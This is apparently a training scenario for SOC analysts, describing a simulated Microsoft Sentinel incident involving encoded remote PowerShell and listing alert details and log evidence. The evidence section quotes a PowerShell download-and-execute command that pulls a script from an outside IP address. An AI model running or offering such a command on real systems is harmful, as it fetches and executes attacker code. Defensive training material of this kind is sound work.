# 🔥 Microsoft Sentinel Investigation Scenario — Suspicious Remote PowerShell Activity

## 📌 Overview
This document provides a realistic, end-to-end Microsoft Sentinel investigation scenario suitable for SOC analyst training, labs, apprenticeship assessments, and blue-team exercises.

---

## 🧠 Scenario Background
At **03:12 AM**, Microsoft Sentinel generates a **high-severity incident**:

- **Incident Name:** Suspicious PowerShell Remote Execution  
- **Severity:** High  
- **Alerts:** 1  
- **Status:** New  
- **Entities:** User, Host, Process  

This analytics rule was triggered because a workstation executed remote PowerShell with Base64-encoded commands, a common tactic in malware delivery and lateral movement.

---

## 🧩 Sentinel Alert Details (Simulated)
**Alert Summary:**

- **User:** jason.raymond@company.co.uk  
- **Host:** WIN10-SALFRD-004  
- **Process:** powershell.exe  
- **Remote Host:** 192.168.54.22  
- **Encoded Command:** powershell.exe -enc JAB3AGM...  

_Base64-encoded PowerShell is a well-known indicator of compromise._

---

## 🧩 Evidence Found in Sentinel (Simulated)
<details>
<summary>1. Script Block Logging (Event 4104)</summary>

```text
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('hxxp://188.166.21.55/payload.ps1')
```
